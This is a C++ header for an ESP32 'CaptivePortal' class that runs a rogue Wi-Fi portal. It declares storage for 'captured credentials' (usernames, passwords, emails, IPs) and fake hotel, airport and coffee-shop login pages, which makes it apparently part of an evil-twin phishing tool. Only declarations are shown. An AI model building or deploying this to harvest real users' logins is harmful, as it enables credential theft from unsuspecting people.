#ifndef CAPTIVE_PORTAL_H
#define CAPTIVE_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

// Structure to store captured credentials
struct Credential {
    String timestamp;
    String username;
    String password;
    String email;
    String ipAddress;
};

class CaptivePortal {
public:
    CaptivePortal();
    
    // Start captive portal
    void begin(const char* ssid);
    
    // Stop captive portal
    void stop();
    
    // Handle DNS and web server (call in loop)
    void handleClient();
    
    // Check if portal is running
    bool isRunning();
    
    // Get captured credentials count
    int getCredentialCount();
    
    // Get credential by index
    Credential getCredential(int index);
    
    // Clear all credentials
    void clearCredentials();
    
    // Get all credentials as formatted string
    String getFormattedCredentials();
    
    // Set custom portal HTML
    void setPortalHTML(const String& html);
    
    // Set portal type (generic, hotel, airport, etc.)
    void setPortalType(int type);

private:
    DNSServer* dnsServer;
    AsyncWebServer* webServer;
    
    bool running;
    String currentSSID;
    String portalHTML;
    
    // Credential storage
    Credential credentials[50]; // Store up to 50 credentials
    int credentialCount;
    
    // Web server handlers
    void setupWebServer();
    void handleRoot(AsyncWebServerRequest *request);
    void handleLogin(AsyncWebServerRequest *request);
    void handleSuccess(AsyncWebServerRequest *request);
    
    // Generate default portal HTML
    String generateGenericPortal();
    String generateHotelPortal();
    String generateAirportPortal();
    String generateCoffeeShopPortal();
    
    // Get current timestamp
    String getTimestamp();
};

// Portal types
#define PORTAL_GENERIC 0
#define PORTAL_HOTEL 1
#define PORTAL_AIRPORT 2
#define PORTAL_COFFEE 3

#endif // CAPTIVE_PORTAL_H